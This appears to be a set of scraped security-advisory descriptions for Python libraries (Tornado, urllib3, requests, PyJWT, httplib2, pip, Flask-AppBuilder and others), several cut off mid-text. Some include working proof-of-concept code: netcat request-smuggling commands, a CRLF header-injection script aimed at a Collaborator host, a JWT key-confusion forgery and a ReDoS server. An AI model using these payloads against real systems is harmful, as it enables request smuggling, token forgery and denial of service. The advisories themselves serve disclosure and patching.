This is known to apply to older versions of haproxy, although the current release is not affected.\n\n## Details\nTornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:\n### `tornado/http1connection.py:445`\n```python3\n            self._expected_content_remaining = int(headers[\"Content-Length\"])\n```\n### `tornado/http1connection.py:621`\n```python3\n                content_length = int(headers[\"Content-Length\"])  # type: Optional[int]\n```\n### `tornado/http1connection.py:671`\n```python3\n            chunk_len = int(chunk_len_str.strip(), 16)\n```\nBecause `int(\"0_0\") == int(\"+0\") == int(\"-0\") == int(\"0\")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. \n\n",

      "description": "Flask-Cache adds easy cache support to Flask. The Flask-Caching extension through 1.10.1 for Flask relies on Pickle for serialization, which may lead to remote code execution or local privilege escalation. If an attacker gains access to cache storage (e.g., filesystem, Memcached, Redis, etc.), they can construct a crafted payload, poison the cache, and execute Python code.\n\nHowever, this is not a high-severity issue, as for an attack like this to work, an attacker must:\n\n1. Be able to write arbitrary values to the cache\n2. Be able to generate a cache key that will collide with a value being read by the application\n3. Cause the application to read a maliciously-injected value\n\nAny situation where all 3 of those is true is a situation where the application has larger problems; for example, if someone's able to inject malicious cached rendered pages into a Flask app's cache, then they can make the website say literally anything they want, regardless of whether it involves the execution of remote code. Basically, the Pickle vulnerability follows from a website already being extremely vulnerable (due to conditions 1 and 2 being met).",

In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.\n\nBecause this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.\n\nUsers should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.\n* Not disabling HTTP redirects.\n* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.\n\n## Remediation\n\n* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Proxy-Authorization` header.",

      "description": "### Summary\n\nThe Azure Storage Encryption library in Java and other languages is vulnerable to a CBC Padding Oracle attack, similar to CVE-2020-8911. The library is not vulnerable to the equivalent of CVE-2020-8912, but only because it currently only supports AES-CBC as encryption mode. \n\n### Severity\n\nModerate - The vulnerability poses insider risks/privilege escalation risks, circumventing controls for stored data.\n\n### Further Analysis\nThe Java Azure Blob Storage Encryption SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the container in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.\n\nThis advisory describes the plaintext revealing vulnerabilities in the Java Azure Blob Storage Encryption SDK, with a similar issue in the other blob storage SDKs being present as well.\n\nIn the current version of the Azure Blob Storage crypto SDK, the only algorithm option that allows users to encrypt files is to AES-CBC, without computing a MAC on the data.\n\nThis exposes a padding oracle vulnerability: If the attacker has write access to the blob container bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) 128*length(plaintext) queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.\n\n### Timeline\n**Date reported**: March 29 2022\n**Date preview**: June 16 2022\n**Date GA**: July 11 2022\n**Date disclosed**: July 17 2022",

      "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:\n\n```python\nresp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False)\nprint(resp.status)\n# 302\n```\n\nHowever, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:\n\n```python\nimport urllib3\n\nhttp = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect\nhttp = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above\nhttp = urllib3.PoolManager(retries=False)  # should return the first response\n\nresp = http.request(\"GET\", \"https://httpbin.org/redirect/1\")\n```\n\nHowever, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.\n\n## Affected usages\n\nPassing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.\n\nBy default, requests and botocore users are not affected.\n\n## Impact\n\nRedirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.\n\n## Remediation\n\nYou can remediate this vulnerability with the following steps:\n\n * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.\n * Disable redirects at the `request()` level instead of the `PoolManager()` level.",

      "description": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",

Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.\n\nThis allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.\n",

      "description": "### Summary\n\nTerrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.\n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details see [https://terrapin-attack.com](https://terrapin-attack.com). \n\n### Impact\n\nThis attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.",

A malicious sdist can include links that escape the target directory and overwrite arbitrary files on the invoking host during `pip install`.\n\n### Impact\n\nSuccessful exploitation enables arbitrary file overwrite outside the build/extraction directory on the machine running `pip`. This can be leveraged to tamper with configuration or startup files and may lead to further code execution depending on the environment, but the direct, guaranteed impact is integrity compromise on the vulnerable system.\n\n### Conditions\n\nThe issue is triggered when installing an attacker-controlled sdist (e.g., from an index or URL) and the fallback extraction code path is used. No special privileges are required beyond running `pip install`; active user action is necessary.\n\n### Remediation\n\nThe [fix](https://github.com/pypa/pip/pull/13550) is available starting in pip `25.3`. Using a Python interpreter that implements the safe-extraction behavior described by **PEP 706** provides additional defense in depth for other `tarfile` issues but is not a substitute for upgrading pip for this specific flaw.",

      "description": "### Impact\n\nSince Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get('http://github.com/', allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com)",

      "description": "### Summary\nTornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",

      "description": "A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.",

      "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\n\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \n> attacker submitting the JWT token can choose the used signing algorithm.\n> \n> The PyJWT library requires that the application chooses what algorithms \n> are supported. The application can specify \n> \"jwt.algorithms.get_default_algorithms()\" to get support for all \n> algorithms. They can also specify a single one of them (which is the \n> usual use case if calling jwt.decode directly. However, if calling \n> jwt.decode in a helper function, all algorithms might be enabled.)\n> \n> For example, if the user chooses \"none\" algorithm and the JWT checker \n> supports that, there will be no signature checking. This is a common \n> security issue with some JWT implementations.\n> \n> PyJWT combats this by requiring that the if the \"none\" algorithm is \n> used, the key has to be empty. As the key is given by the application \n> running the checker, attacker cannot force \"none\" cipher to be used.\n> \n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \n> if the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \n> attacker can just use the publicly known public key to sign the token \n> and the checker would use the same key to verify.\n> \n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \n> With ed25519, PyJWT supports public keys that start with \"ssh-\", for \n> example \"ssh-ed25519\".\n\n```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n     print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key.

      "description": "### Impact\nA malicious server which responds with long series of `\\xa0` characters in the `www-authenticate` header may cause Denial of Service (CPU burn while parsing header) of the httplib2 client accessing said server.\n\n### Patches\nVersion 0.19.0 contains new implementation of auth headers parsing, using pyparsing library.\nhttps://github.com/httplib2/httplib2/pull/182\n\n### Workarounds\n```py\nimport httplib2\nhttplib2.USE_WWW_AUTH_STRICT_PARSING = True\n```\n\n### Technical Details\n\nThe vulnerable regular expression is https://github.com/httplib2/httplib2/blob/595e248d0958c00e83cb28f136a2a54772772b50/python3/httplib2/__init__.py#L336-L338\n\nThe section before the equals sign contains multiple overlapping groups. Ignoring the optional part containing a comma, we have:\n\n    \\s*[^ \\t\\r\\n=]+\\s*=\n\nSince all three infinitely repeating groups accept the non-breaking space character `\\xa0`, a long string of `\\xa0` causes catastrophic backtracking.\n\nThe complexity is cubic, so doubling the length of the malicious string of `\\xa0` makes processing take 8 times as long.\n\n### Reproduction Steps\n\nRun a malicious server which responds with\n\n    www-authenticate: x \\xa0\\xa0\\xa0\\xa0x\n\nbut with many more `\\xa0` characters.\n\nAn example malicious python server is below:\n\n```py\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\ndef make_header_value(n_spaces):\n    repeat = \"\\xa0\" * n_spaces\n    return f\"x {repeat}x\"\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.log_request(401)\n        self.send_response_only(401)  # Don't bother sending Server and Date\n        n_spaces = (\n            int(self.path[1:])  # Can GET e.g. /100 to test shorter sequences\n            if len(self.path) > 1 else\n            65512  # Max header line length 65536\n        )\n        value = make_header_value(n_spaces)\n        self.send_header(\"www-authenticate\", value)  # This header can actually be sent multiple times\n        self.end_headers()\n\nif __name__ == \"__main__\":\n    HTTPServer((\"\", 1337), Handler).serve_forever()\n```\n\nConnect to the server with httplib2:\n\n```py\nimport httplib2\nhttplib2.Http(\".cache\").request(\"http://localhost:1337\", \"GET\")\n```\n\nTo benchmark performance with shorter strings, you can set the path to a number e.g. http://localhost:1337/1000\n\n\n### References\nThanks to [Ben Caller](https://github.com/b-c-ds) ([Doyensec](https://doyensec.com)) for finding vulnerability and discrete notification.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [httplib2](https://github.com/httplib2/httplib2/issues/new)\n* Email [current maintainer at 2021-01](mailto:temotor@gmail.com)",

While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.\n\n### Risk Assessment\nAs easy_install and package_index are deprecated, the exploitation surface is reduced.\nHowever, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.\n\n### Impact\nAn attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.\n\n### References\nhttps://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5\nhttps://github.com/pypa/setuptools/issues/4946",

This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.\n\nThis is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).\n\n### Severity\nThis is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.\n\n### Proof of Concept\nFor reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)\n\n### Remediation and Mitigation\nA mitigation is available now.

Other than manually cleaning the session database (for database session backend), or changing the secure_key and restarting the webserver, there were no mechanisms to force-logout the user (and all other users with that).\n\nWith this fix implemented, when using the database session backend, the existing sessions of the user are invalidated when the password of the user is reset. When using the securecookie session backend, the sessions are NOT invalidated and still require changing the secure key and restarting the webserver (and logging out all other users), but the user resetting the password is informed about it with a flash message warning displayed in the UI. Documentation is also updated explaining this behaviour.\n\nUsers of Apache Airflow are advised to upgrade to version 2.7.0 or newer to mitigate the risk associated with this vulnerability.\n",

This vulnerability could grant an attacker unauthorised privilege access if a custom OpenID service is deployed by the attacker and accessible by the backend. \n\nThis vulnerability is only exploitable when the application is using the old (deprecated 10 years ago) OpenID 2.0 authorization protocol (which is very different from the popular OIDC - Open ID Connect - popular protocol used today). Currently, this protocol is regarded as legacy, with significantly reduced usage and not supported for several years by major authorization providers.\n\n### Patches\nUpgrade to Flask-AppBuilder 4.3.11\n\n### Workarounds\nIf upgrade is not possible add the following to your config:\n\n```\nfrom flask import flash, redirect\nfrom flask_appbuilder import expose\nfrom flask_appbuilder.security.sqla.manager import SecurityManager\nfrom flask_appbuilder.security.views import AuthOIDView\nfrom flask_appbuilder.security.forms import LoginForm_oid\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\n\nclass FixedOIDView(AuthOIDView):\n    @expose(\"/login/\", methods=[\"GET\", \"POST\"])\n    def login(self, flag=True):\n        form = LoginForm_oid()\n        if form.validate_on_submit():\n            identity_url = None\n            for provider in self.appbuilder.sm.openid_providers:\n                if provider.get(\"url\") == form.openid.data:\n                    identity_url = form.openid.data\n            if identity_url is None:\n                flash(self.invalid_login_message, \"warning\")\n                return redirect(self.appbuilder.get_url_for_login)\n        return super().login(flag=flag)\n\nclass FixedSecurityManager(SecurityManager):\n    authoidview = FixedOIDView\n\n\nFAB_SECURITY_MANAGER_CLASS = \"config.FixedSecurityManager\"\n```",
